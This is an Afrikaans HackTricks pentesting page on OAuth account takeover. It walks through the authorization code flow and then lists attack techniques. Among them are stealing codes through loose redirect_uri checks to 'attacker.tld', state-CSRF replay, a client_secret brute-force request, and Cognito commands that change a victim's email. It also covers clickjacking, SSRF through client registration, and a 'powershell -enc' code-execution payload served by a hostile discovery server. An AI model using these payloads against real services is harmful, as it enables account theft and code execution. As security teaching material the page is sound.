# OAuth na Rekening-oorname

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting <a href="#d4a8" id="d4a8"></a>

OAuth bied verskeie weergawes; fundamentele insigte is beskikbaar by [OAuth 2.0 documentation](https://oauth.net/2/). Hierdie bespreking fokus hoofsaaklik op die wydgebruikte [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), wat 'n **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server) verskaf.

Beskou 'n hipotetiese webwerf _**https://example.com**_ wat ontwerp is om **al jou social media posts te vertoon**, insluitende privaat poste. Om dit te bereik word OAuth 2.0 gebruik. _https://example.com_ sal jou toestemming vra om **jou social media posts te access**. Gevolglik sal 'n consent screen op _https://socialmedia.com_ verskyn wat die **permissions being requested and the developer making the request** uiteensit. Nadat jy toestemming gegee het, kry _https://example.com_ die vermoë om **jou poste namens jou te access**.

Dit is noodsaaklik om die volgende komponente binne die OAuth 2.0 raamwerk te verstaan:

- **resource owner**: Jy, as die **gebruiker/entiteit**, verleen toestemming om toegang tot jou bron te kry, soos jou social media rekeningposte.
- **resource server**: Die **bediener wat geauthentiseerde versoeke hanteer** nadat die toepassing 'n `access token` namens die `resource owner` verkry het, bv. **https://socialmedia.com**.
- **client application**: Die **toepassing wat toestemming soek** van die `resource owner`, soos **https://example.com**.
- **authorization server**: Die **bediener wat `access tokens` uitreik** aan die `client application` nadat die `resource owner` suksesvol geverifieer is en toestemming gegee het, bv. **https://socialmedia.com**.
- **client_id**: 'n Openbare, unieke identifiseerder vir die toepassing.
- **client_secret:** 'n Vertroulike sleutel, slegs bekend aan die toepassing en die authorization server, gebruik om `access_tokens` te genereer.
- **response_type**: 'n Waarde wat die **tipe token wat versoek word** spesifiseer, soos `code`.
- **scope**: Die **toegangsvlak** wat die `client application` van die `resource owner` aanvra.
- **redirect_uri**: Die **URL waarna die gebruiker na toestemming herlei word**. Dit moet gewoonlik ooreenstem met die vooraf-geregistreerde redirect URL.
- **state**: 'n Parameter om **data oor die gebruiker se omleiding heen en terug na die authorization server te behou**. Sy uniekheid is kritiek as 'n **CSRF protection mechanism**.
- **grant_type**: 'n Parameter wat **die grant type en die tipe token wat teruggegee behoort te word** aandui.
- **code**: Die authorization code van die `authorization server`, gebruik saam met `client_id` en `client_secret` deur die client application om 'n `access_token` te verkry.
- **access_token**: Die **token wat die client application gebruik vir API-versoeke** namens die `resource owner`.
- **refresh_token**: Laat die toepassing toe om **'n nuwe `access_token` te kry sonder om die gebruiker weer te vra**.

### Vloei

Die **werklike OAuth vloei** verloop soos volg:

1. Jy navigeer na [https://example.com](https://example.com) en kies die “Integrate with Social Media” knoppie.
2. Die webwerf stuur dan 'n versoek na [https://socialmedia.com](https://socialmedia.com) om jou toestemming te vra sodat https://example.com se toepassing jou poste kan access. Die versoek is gestruktureer as:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Jy word dan 'n toestemmingsbladsy aangebied.
4. Na jou goedkeuring stuur Social Media 'n antwoord na die `redirect_uri` met die `code` en `state`-parameters:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com gebruik hierdie `code`, saam met sy `client_id` en `client_secret`, om 'n server-side versoek te maak om 'n `access_token` namens jou te bekom, wat toegang tot die toestemmings waarvoor jy ingestem het moontlik maak:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Ten slotte eindig die proses wanneer https://example.com jou `access_token` gebruik om 'n API-oproep na Sosiale Media te maak om toegang te kry tot

## Kwetsbaarhede <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), die authorization server moet die blaaier slegs herlei na **pre-registered, exact redirect URIs**. Enige swakheid hier laat 'n aanvaller toe om 'n slagoffer deur 'n kwaadwillige authorization URL te stuur sodat die IdP die slagoffer se `code` (en `state`) reguit na 'n aanvaller-endpoint lewer, wat dit dan kan inruil en tokens insamel.

Tipiese aanvals-werkvloei:

1. Skep `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` en stuur dit na die slagoffer.
2. Die slagoffer autentiseer en keur die scopes goed.
3. Die IdP herlei na `attacker.tld/callback?code=<victim-code>&state=...` waar die aanvaller die versoek log en onmiddellik die `code` inruil.

Algemene validasiefoute om te ondersoek:

- **No validation** – enige absolute URL word aanvaar, wat lei tot onmiddellike diefstal van die `code`.
- **Weak substring/regex checks on the host** – omseil met gelykende domeine soos `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, of `match.com@evil.com`.
- **IDN homograph mismatches** – validasie gebeur op die punycode-vorm (`xn--`), maar die blaaier herlei na die Unicode-domein wat deur die aanvaller beheer word.
- **Arbitrary paths on an allowed host** – wys `redirect_uri` na `/openredirect?next=https://attacker.tld` of enige XSS/user-content endpoint lek die `code` hetsy deur geketende redirects, Referer headers, of ingespotte JavaScript.
- **Directory constraints without normalization** – patrone soos `/oauth/*` kan omseil word met `/oauth/../anything`.
- **Wildcard subdomains** – die aanvaarding van `*.example.com` beteken enige takeover (dangling DNS, S3 bucket, etc.) lewer onmiddellik 'n geldige callback.
- **Non-HTTPS callbacks** – die deurlaat van `http://` URI's gee netwerk-aanvallers (Wi‑Fi, korporatiewe proxy) die geleentheid om die `code` in transito te gryp.

Hersien ook bykomende redirect-styl parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) en die OpenID discovery document (`/.well-known/openid-configuration`) vir addisionele endpoints wat dieselfde validasiefoute kan erf.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Soos vermeld in hierdie bug bounty-verslag [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) kan dit moontlik wees dat die redirect **URL in die response weerspieël word** van die bediener nadat die gebruiker autentiseer, en sodoende **vatbaar vir XSS**. Moontlike payload om te toets:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Onbehoorlike hantering van die `state` parameter <a href="#bda5" id="bda5"></a>

Die `state` parameter is die Authorization Code flow CSRF token: die client moet 'n **kriptografies ewekansige waarde per blaaier-instansie** genereer, dit stoor op 'n plek wat slegs daardie blaaier kan lees (cookie, local storage, ens.), dit in die authorization request stuur, en enige response wat nie dieselfde waarde teruggee nie, verwerp. Wanneer die waarde staties, voorspelbaar, opsioneel of nie aan die gebruiker se sessie gebind is nie, kan die aanvaller hul eie OAuth-flow volmaak, die finale `?code=` request opvang (sonder om dit te stuur), en later 'n slagoffer se blaaier dwing om daardie request te herhaal sodat die slagofferrekening aan die aanvaller se identity provider-profiel gekoppel word.

Die replay-patroon is altyd dieselfde:

1. Die aanvaller autentiseer by die IdP met hul rekening en onderskep die laaste redirect wat `code` (en enige `state`) bevat.
2. Hulle gooi daardie request weg, behou die URL, en misbruik later enige CSRF-primitive (link, iframe, auto-submitting form) om die slagoffer se blaaier te dwing om dit te laai.
3. As die client `state` nie afdwing nie, verbruik die toepassing die aanvaller se authorization result en teken die aanvaller in op die slagoffer se app-rekening.

'n Praktiese kontrolelys vir `state` hantering tydens toetse:

- **Missing `state` entirely** – as die parameter nooit verskyn nie, is die hele login CSRFable.
- **`state` not required** – verwyder dit uit die aanvanklike request; as die IdP steeds codes uitreik wat die client aanvaar, is die verdediging opt-in.
- **Returned `state` not validated** – saboteer die waarde in die response (Burp, MITM proxy). Aanvaarding van nie-passende waardes beteken die gestoor token word nooit vergelyk nie.
- **Predictable or purely data-driven `state`** – baie apps sit redirect paths of JSON blobs in die `state` sonder om ewekansigheid by te meng, wat aanvallers toelaat om geldige waardes te raai en flows te herhaal. Plak altyd sterk entropie voor/na die kodering van data.
- **`state` fixation** – as die app gebruikers toelaat om die `state` waarde te voorsien (bv. via gesmee authorization URLs) en dit deur die hele flow hergebruik, kan 'n aanvaller 'n bekende waarde sluit en dit oor slagoffers hergebruik.

PKCE kan `state` aanvul (veral vir public clients) deur die authorization code aan 'n code verifier te bind, maar web clients moet steeds `state` volg om cross-user CSRF/account-linking foute te voorkom.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Sonder E-posverifikasie tydens rekeningskep**: Aanvallers kan vooraf 'n rekening skep met die slagoffer se e-pos. As die slagoffer later 'n third-party diens vir login gebruik, kan die toepassing per ongeluk daardie third-party rekening koppel aan die aanvaller se vooraf-geskrewe rekening, wat tot ongemagtigde toegang lei.
2. **Misbruik van slordige OAuth e-posverifikasie**: Aanvallers kan OAuth-dienste uitbuit wat e-posse nie verifieer nie deur by daardie diens te registreer en dan die rekening se e-pos na die slagoffer se e-pos te verander. Hierdie metode loop 'n soortgelyke risiko van ongemagtigde rekeningtoegang, net deur 'n ander aanvalspad.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Die `client_id` is opsetlik openbaar, maar die **`client_secret` moet nooit deur eindgebruikers teruggevind kan word nie**. Authorization Code implementasies wat die secret in **mobile APKs, desktop clients, or single-page apps** inbed, gee daardie credential effektief aan enigiemand wat die pakket kan aflaai. Ondersoek publieke clients altyd deur:

- Die APK/IPA, desktop installer of Electron app uit te pak en te grepp vir `client_secret`, Base64 blobs wat na JSON dekodeer, of hard-coded OAuth endpoints.
- Gebundelde konfigurasielêers (plist, JSON, XML) of gedekompileerde stringe vir client credentials na te gaan.

Sodra die aanvaller die secret onttrek het, hoef hulle net enige slagoffer se authorization `code` te steel (via 'n swakke `redirect_uri`, logs, ens.) om onafhanklik `/token` te hit en access/refresh tokens te mint sonder om die regmatige app te betrek. Behandel public/native clients as **onvermoë om geheime te hou**—hulle moet eerder op PKCE (RFC 7636) staatmaak om besit van 'n per-instansie code verifier te bewys in plaas van 'n statiese secret. Tydens toetsing, bevestig of PKCE verpligtend is en of die backend token-ruilings werklik verwerp wat óf die `client_secret` **of** 'n geldige `code_verifier` weglaat.

### Client Secret Bruteforce

Jy kan probeer om die `client_secret` te **bruteforce** van 'n diensverskaffer by die identity provider om rekeninge te probeer steel.  
Die request om te BF kan soortgelyk lyk aan:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Sodra die kliënt die **code and state** het, en dit in die **Referer header** weerspieël word wanneer hy na 'n ander bladsy navigeer, is dit kwesbaar.

### Access Token Stored in Browser History

Die kernwaarborg van die Authorization Code grant is dat **access tokens nooit die resource owner’s browser bereik nie**. Wanneer implementerings tokens aan die kliëntkant lek, maak enige klein fout (XSS, Referer leak, proxy logging) onmiddellike rekeningkompromie moontlik. Kontroleer altyd vir:

- **Tokens in URLs** – as `access_token` in die query/fragment verskyn, beland dit in browser history, server logs, analytics, en Referer headers wat aan derde partye gestuur word.
- **Tokens wat deur onbetroubare middleboxes gaan** – tokens wat oor HTTP of deur debugging/corporate proxies teruggestuur word, laat network observers toe om dit direk te kap.
- **Tokens in JavaScript state gestoor** – React/Vue stores, global variables, of serialized JSON blobs maak tokens sigbaar vir elke script op die origin (insluitend XSS payloads of kwaadwillige extensions).
- **Tokens in Web Storage gepersisteer** – `localStorage`/`sessionStorage` hou tokens lank ná logout op gedeelde toestelle en is deur scripts toeganklik.

Enige van hierdie bevindings verhoog gewoonlik andersins “low” bugs (soos 'n CSP bypass of DOM XSS) na volledige API takeover omdat die aanvaller eenvoudig die gelekte bearer token kan lees en hergebruik.

### Everlasting Authorization Code

Authorization codes moet **kortlewend, single-use, en replay-aware** wees. Wanneer jy 'n flow evalueer, capture 'n `code` en:

- **Test die leeftyd** – RFC 6749 beveel minute aan, nie ure nie. Probeer die code ingewissel na 5–10 minute; as dit nog werk, is die blootstellingsvenster vir enige gelekte code te lank.
- **Test sekwensiële hergebruik** – stuur dieselfde `code` twee keer. Indien die tweede versoek nog 'n token oplewer, kan aanvallers sessies oneindig kloneer.
- **Test gelyktydige inwisseling/race conditions** – vuur twee token-versoeke parallel (Burp intruder, turbo intruder). Swakker issuers gee soms albei toe.
- **Let op replay-hantering** – 'n hergebruikpoging moet nie net faal nie, maar ook enige tokens wat reeds uit daardie code gemunt is, intrek. Anders bly die aanvaller se eerste token aktief ná 'n hergebruikdeteksie.

Om 'n replay-vriendelike code te kombineer met enige `redirect_uri` of logging-bug laat toe om volhoubare rekeningtoegang te hê selfs nadat die slagoffer die legitieme login voltooi het.

### Authorization/Refresh Token not bound to client

As jy die **authorization code** kan kry en dit met 'n ander client kan gebruik, kan jy ander rekeninge takeover.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In hierdie bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) kan jy sien dat die **token** wat **AWS Cognito** teruggee aan die gebruiker moontlik **genoeg permissies het om die user data oor te skryf**. Daarom, as jy die user email vir 'n ander user email kan verander, mag jy in staat wees om ander rekeninge te **take over**.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Vir meer gedetailleerde inligting oor hoe om AWS Cognito te misbruik, sien [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Misbruik van ander Apps se tokens <a href="#bda5" id="bda5"></a>

Soos in [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) genoem, OAuth flows wat verwag om die **token** (en nie 'n code nie) te ontvang, kan kwesbaar wees as hulle nie nagaan dat die token aan die app behoort nie.

Dit is omdat 'n **attacker** 'n **application supporting OAuth and login with Facebook** (byvoorbeeld) in sy eie toepassing kan skep. Sodra 'n **victim** met Facebook in die **attackers application** aanmeld, kan die attacker die **OAuth token of the user given to his application** kry en dit gebruik om by die victim se OAuth-toepassing aan te meld met die victim se user token.

> [!CAUTION]
> Daarom, as die attacker daarin slaag om die user toegang te gee tot sy eie OAuth application, sal hy die victims account in toepassings wat 'n token verwag en nie nagaan of die token aan hul app ID toegeken is nie, kan oorneem.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Volgens [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), was dit moontlik om 'n victim te laat 'n bladsy oopmaak met 'n **returnUrl** wat na die attackers host wys. Hierdie inligting sou in 'n cookie (RU) gestoor word en in 'n **later stap** sal die **prompt** die **user** vra of hy toegang wil gee aan daardie attackers host.

Om hierdie prompt te omseil, was dit moontlik om 'n tab oop te maak om die **Oauth flow** te begin wat die RU-cookie deur die **returnUrl** sal stel, die tab te sluit voordat die prompt gewys word, en 'n nuwe tab te open sonder daardie waarde. Dan sal die **prompt nie oor die attackers host inlig nie**, maar die cookie sal na daardie host gestel wees, sodat die **token in die redirection na die attackers host** gestuur sal word.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Soos verduidelik in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), laat sommige OAuth-implementasies toe om die GET-parameter **`prompt`** as None (**`&prompt=none`**) aan te dui om te voorkom dat gebruikers in die web gevra word om die gegewe toegang te bevestig as hulle reeds in die platform aangemeld is.

### response_mode

Soos [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), kan dit moontlik wees om die parameter **`response_mode`** aan te dui om te bepaal waar die code in die finale URL verskaf word:

- `response_mode=query` -> Die code word binne 'n GET-parameter verskaf: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Die code word binne die URL-fragment verskaf: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Die code word binne 'n POST-form gestuur met 'n input genaamd `code` en die waarde
- `response_mode=web_message` -> Die code word in 'n postMessage gestuur: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs is ideale clickjacking targets: as hulle ingesluit kan word in 'n frame, kan 'n attacker eie grafika oorleë, die werklike knoppies verberg en users mislei om gevaarlike scopes te keur of rekeninge te koppel. Bou PoCs wat:

1. Laai die IdP authorization URL binne 'n `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Gebruik absolute positioning/opacity truuks om fake buttons te belyn met die versteekte **Allow**/**Approve** kontroles.
3. Opsioneel pre-fill parameters (scopes, redirect URI) sodat die gesteelde goedkeuring onmiddellik die attacker bevoordeel.

Tydens toetsing, verifieer dat IdP-bladsye óf `X-Frame-Options: DENY/SAMEORIGIN` óf 'n beperkende `Content-Security-Policy: frame-ancestors 'none'` uitstuur. As geen van beide teenwoordig is nie, demonstreer die risiko met gereedskap soos [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) en neem op hoe maklik 'n victim die attacker se app autoriseer. Vir addisionele payload-idees, sien [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Volgens [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), is dit 'n OAuth flow wat toelaat om via **username** en **password** in te log. As tydens hierdie eenvoudige flow 'n **token** teruggestuur word met toegang tot alle aksies wat die user kan uitvoer, is dit moontlik om 2FA te omseil met daardie token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Hierdie [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) beskryf hoe dit moontlik was om 'n **open redirect** te misbruik wat gebaseer is op die **referrer** om OAuth na ATO te eskaleer. Die aanval was:

1. Victim toegang die attacker se webblad.
2. Die victim open die kwaadwillige skakel en 'n opener begin die Google OAuth flow met `response_type=id_token,code&prompt=none` as bykomende parameters en gebruik die attackers webwerf as **referrer**.
3. In die opener, nadat die provider die victim geautoriseer het, stuur dit hulle terug na die waarde van die `redirect_uri` parameter (victim web) met 'n 30X-kode wat steeds die attacker se webwerf in die referer hou.
4. Die victim se webwerf trigger die open redirect gebaseer op die referrer en stuur die victim na die attacker se webwerf; omdat die **`respose_type`** **`id_token,code`** was, sal die code in die URL se **fragment** teruggestuur word en dit die attacker toelaat om die rekening van die user via Google op die victim se site oor te neem.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth dien as 'n minder voor die hand liggende, maar kritieke vektor vir sekuriteitskwesbaarhede, spesifiek vir **Server-Side Request Forgery (SSRF)**. Hierdie endpoint laat OAuth-servers toe om besonderhede oor client-toepassings te ontvang, insluitend sensitiewe URL's wat uitgebuit kan word.

Belangrike punte:

- **Dynamic Client Registration** word dikwels aan `/register` gekarteer en aanvaar besonderhede soos `client_name`, `client_secret`, `redirect_uris`, en URL's vir logo's of JSON Web Key Sets (JWKs) via POST-versoeke.
- Hierdie funksie volg die spesifikasies in **RFC7591** en **OpenID Connect Registration 1.0**, wat parameters insluit wat potensieel vir SSRF kwesbaar is.
- Die registrasieproses kan per ongeluk servers vir SSRF blootstel op verskeie maniere:
  - **`logo_uri`**: 'n URL vir die client se logo wat deur die server opgehaal kan word, wat SSRF kan veroorsaak of tot XSS kan lei as die URL foutief hanteer word.
  - **`jwks_uri`**: 'n URL na die client se JWK-dokument, wat, as kwaadwillig saamgestel, die server kan laat uitgaande versoeke na 'n attacker-controlled server maak.
  - **`sector_identifier_uri`**: Verwys na 'n JSON-array van `redirect_uris`, wat die server moontlik kan aflaai en sodoende 'n SSRF-geleentheid skep.
  - **`request_uris`**: Lys van toegelate request URIs vir die client, wat uitgebuit kan word as die server hierdie URIs aan die begin van die authorization proses aflaai.

Eksplotasie-strategie:

- SSRF kan getrigger word deur 'n nuwe client te registreer met kwaadwillige URL's in parameters soos `logo_uri`, `jwks_uri`, of `sector_identifier_uri`.
- Alhoewel direkte eksploytasie via `request_uris` moontlik deur whitelist-beperkings bekamp word, kan die verskaffing van 'n vooraf-geregistreerde, attacker-controlled `request_uri` SSRF tydens die authorization-fase fasiliteer.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Navorsing oor [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (wat `mcp-remote` clients soos Claude Desktop, Cursor of Windsurf raak) wys hoe **dynamic OAuth discovery 'n RCE primitive word** wanneer die client IdP metadata reguit aan die operating system deurgee. Die remote MCP-server stuur 'n attacker-controlled `authorization_endpoint` terug tydens die discovery-uitruiling (`/.well-known/openid-configuration` of enige metadata RPC). `mcp-remote ≤0.1.15` sou dan die system URL handler (`start`, `open`, `xdg-open`, ens.) oproep met watter string ook al ontvang is, sodat enige scheme/path wat deur die OS ondersteun word plaaslik uitgevoer word.

Attack workflow

1. Wys die desktop agent na 'n hostile MCP/OAuth server (`npx mcp-remote https://evil`). Die agent ontvang `401` plus metadata.
2. Die server antwoord met JSON soos:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Die kliënt loods die OS-hanteraar vir die verskafde URI. Windows aanvaar payloads soos `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux aanvaar `file:///Applications/Calculator.app/...` of selfs pasgemaakte skemas soos `cmd://bash -lc '<payload>'` as dit geregistreer is.
4. Omdat dit gebeur voordat enige gebruikersinteraksie plaasvind, lei **slegs die konfigurasie van die kliënt om met die aanvallerserver te praat tot kode-uitvoering**.

**How to test**

- Rig op enige OAuth-capable desktop/agent wat discovery oor HTTP(S) uitvoer en teruggegewe endpoints lokaal open (Electron apps, CLI helpers, thick clients).
- Onderskep of aanbied die discovery response en vervang `authorization_endpoint`, `device_authorization_endpoint`, of soortgelyke velde met `file://`, `cmd://`, UNC paths, of ander gevaarlike skemas.
- Observeer of die kliënt die scheme/host valideer. Gebrek aan validering lei tot onmiddellike uitvoering onder die gebruiker se konteks en bewys die probleem.
- Herhaal met verskillende skemas om die volle aanvalsoorvlak te karteer (bv., `ms-excel:`, `data:text/html,`, custom protocol handlers) en demonstreer kruisp-platform bereik.

## OAuth providers Race Conditions

As die platform wat jy toets 'n OAuth provider is [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth identifiseer die sub field uniek 'n gebruiker, maar die formaat wissel volgens die Authorization Server. Om gebruikersidentifikasie te standaardiseer, gebruik sommige clients e-posadresse of gebruikersname. Dit is egter riskant omdat:

- Sommige Authorization Servers nie verseker dat hierdie eienskappe (soos email) onveranderlik bly nie.
- In sekere implementasies—soos **"Login with Microsoft"**—vertrou die kliënt op die email-veld, wat **user-controlled by the user in Entra ID** en nie geverifieer is nie.
- 'n Aanvaller kan dit uitbuit deur hul eie Azure AD-organisasie te skep (bv., doyensectestorg) en dit te gebruik om 'n Microsoft login uit te voer.
- Alhoewel die Object ID (gestoor in sub) onveranderlik en veilig is, kan die vertroue op 'n veranderlike email-veld 'n account takeover moontlik maak (byvoorbeeld die kaap van 'n rekening soos victim@gmail.com).

## Client Confusion Attack

In 'n Client Confusion Attack versuim 'n toepassing wat die OAuth Implicit Flow gebruik om te verifieer dat die finale access token spesifiek vir sy eie Client ID gegenereer is. 'n Aanvaller stel 'n publieke webwerf op wat Google’s OAuth Implicit Flow gebruik en mislei duisende gebruikers om aan te meld, en oes sodoende access tokens bedoel vir die aanvaller se webwerf. As hierdie gebruikers ook rekeninge het op 'n ander kwesbare webwerf wat nie die token se Client ID valideer nie, kan die aanvaller die geoesde tokens hergebruik om die slagoffers te imiteer en hul rekeninge oor te neem.

## Scope Upgrade Attack

Die **Authorization Code Grant** tipe behels veilige server-tot-server kommunikasie vir die oordrag van gebruikersdata. As die **Authorization Server** egter implisiet 'n scope-parameter in die Access Token Request vertrou (’n parameter wat nie in die RFC gedefinieer is nie), kan 'n kwaadwillige toepassing die magte van 'n authorization code opgradeer deur 'n hoër scope aan te vra. Nadat die **Access Token** gegenereer is, moet die **Resource Server** dit verifieer: vir JWT tokens behels dit die check van die JWT signature en die onttrekking van data soos client_id en scope, terwyl vir willekeurige string-tokens die bediener die Authorization Server moet query om die token se besonderhede te kry.

## Redirect Scheme Hijacking

In mobiele OAuth-implementasies gebruik apps **custom URI schemes** om redirects met Authorization Codes te ontvang. Omdat verskeie apps egter dieselfde skema op 'n toestel kan registreer, word die aanname dat slegs die legitime kliënt die redirect URI beheer, oortree. Op Android, byvoorbeeld, word 'n Intent URI soos `com.example.app://` gevat gebaseer op die skema en opsionele filters wat in 'n app se intent-filter gedefinieer is. Aangesien Android se intent-resolusie wyd kan wees—veral as slegs die skema gespesifiseer is—kan 'n aanvaller 'n kwaadwillige app registreer met 'n noukeurig saamgestelde intent filter om die authorization code te kaap. Dit kan 'n account takeover moontlik maak óf deur gebruikersinteraksie (wanneer verskeie apps geskik is om die intent te hanteer) óf via omseil-tegnieke wat te spesifieke filters uitbuit, soos uiteengesit in Ostorlab se assessering-vloei-diagram.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
